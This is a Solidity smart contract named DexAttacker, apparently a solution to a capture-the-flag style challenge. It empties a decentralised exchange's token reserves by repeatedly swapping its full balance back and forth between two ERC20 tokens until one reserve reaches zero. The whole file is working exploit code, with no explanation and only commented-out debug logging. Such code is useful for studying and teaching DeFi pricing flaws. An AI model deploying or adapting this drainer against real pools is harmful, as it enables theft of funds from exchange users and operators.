// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// import "hardhat/console.sol";

interface DexI {
    function swap(address from, address to, uint amount) external;
}

contract DexAttacker {
    DexI dex;
    IERC20 token1;
    IERC20 token2;

    constructor(address _dex, address _token1, address _token2) {
        dex = DexI(_dex);
        token1 = IERC20(_token1);
        token2 = IERC20(_token2);
    }

    function callSwap() external {
        address dexAddress = address(dex);
        address token1Address = address(token1);
        address token2Address = address(token2);
        uint swapamount1;
        uint swapamount2;

        while (
            token1.balanceOf(dexAddress) != 0 &&
            token2.balanceOf(dexAddress) != 0
        ) {
            // console.log("att token 1", token1.balanceOf(address(this)));
            // console.log("att token 2", token2.balanceOf(address(this)));
            // console.log("dex token 1", token1.balanceOf(dexAddress));
            // console.log("dex token 2", token2.balanceOf(dexAddress));
            // console.log("-------------------------------------------------");
            token1.approve(dexAddress, token1.balanceOf(address(this)));
            swapamount1 = token1.balanceOf(address(this));
            if (token1.balanceOf(dexAddress) <= swapamount1) {
                swapamount1 = token1.balanceOf(dexAddress);
            }
            dex.swap(token1Address, token2Address, swapamount1);
            if (
                token1.balanceOf(dexAddress) != 0 &&
                token2.balanceOf(dexAddress) != 0
            ) {
                // console.log("att token 1", token1.balanceOf(address(this)));
                // console.log("att token 2", token2.balanceOf(address(this)));
                // console.log("dex token 1", token1.balanceOf(dexAddress));
                // console.log("dex token 2", token2.balanceOf(dexAddress));
                // console.log(
                //     "-------------------------------------------------"
                // );
                token2.approve(dexAddress, token2.balanceOf(address(this)));
                swapamount2 = token2.balanceOf(address(this));
                if (token2.balanceOf(dexAddress) <= swapamount2) {
                    swapamount2 = token2.balanceOf(dexAddress);
                }
                dex.swap(token2Address, token1Address, swapamount2);
            }
        }
    }
}
